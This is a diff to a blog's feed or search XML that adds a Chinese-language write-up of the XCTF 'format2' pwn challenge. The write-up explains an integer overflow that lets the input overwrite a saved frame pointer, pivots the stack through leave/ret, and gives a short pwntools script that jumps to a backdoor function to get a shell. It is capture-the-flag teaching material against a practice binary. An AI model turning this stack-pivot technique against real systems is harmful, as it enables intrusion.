@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>XCTF-format2-整数溢出</title>
+      <link href="/2019/11/20/XCTF-format2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
+      <url>/2019/11/20/XCTF-format2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
+      
+        <content type="html"><![CDATA[<p>本文是对一道比较基础的整数溢出题目的解析，其中运用到的一些有关汇编的知识是自己之前没有接触过的，复盘一下收获颇丰，下<br>面我们来看一下吧。</p><a id="more"></a><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>ida看一下程序：<br><img src="/img/format2/1.jpg" alt="avatar"></p><p>程序首先会对输入进行base64解密，然后对解密后的文本限制长度为12字节</p><p><img src="/img/format2/2.jpg" alt="avatar"></p><p>这里就是程序漏洞的所在了，v4是一个整型，只有八个字节，这里存在一个整数溢出，利用这个漏洞就可以控制auth函数的ebp</p><p><img src="/img/format2/3.jpg" alt="avatar"></p><p>这是一个后门函数，我们需要做的就是控制程序流运行后门程序。</p><h2 id="漏洞的具体利用"><a href="#漏洞的具体利用" class="headerlink" title="漏洞的具体利用"></a>漏洞的具体利用</h2><p>要利用这个漏洞，我们首先就要对汇编语言有一定的了解。<br>当main函数要进入auth函数时，会先进行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">move esp,ebp</span><br><span class="line">sub esp,0x28</span><br></pre></td></tr></table></figure><p>所以auth的ebp就是main的ebp，而在main函数中，最后是leave ，retn<br><img src="/img/format2/4.jpg" alt="avatar"><br>这样我们先修改ebp的值为input_addr,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move esp,ebp  /esp的值变为input_addr</span><br><span class="line">pop ebp</span><br><span class="line">retn(pop rip)  //控制程序流 即call (ebp+4)</span><br></pre></td></tr></table></figure><p>这样我们就可以get shell</p><h2 id="脚本实现"><a href="#脚本实现" class="headerlink" title="脚本实现"></a>脚本实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">p = process(&apos;./format&apos;)</span><br><span class="line">system = 0x8049284 </span><br><span class="line">input_addr = 0x811eb40</span><br><span class="line">p.recvuntil(&apos;Authenticate : &apos;)</span><br><span class="line">payload = &apos;a&apos;*4 + p32(system) + p32(input_addr)</span><br><span class="line">p.sendline(base64.b64encode(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>mma-ctf-2nd-2016-greeting-150</title>
       <link href="/2019/11/18/mma-ctf-2nd-2016-greeting-150/"/>
       <url>/2019/11/18/mma-ctf-2nd-2016-greeting-150/</url>
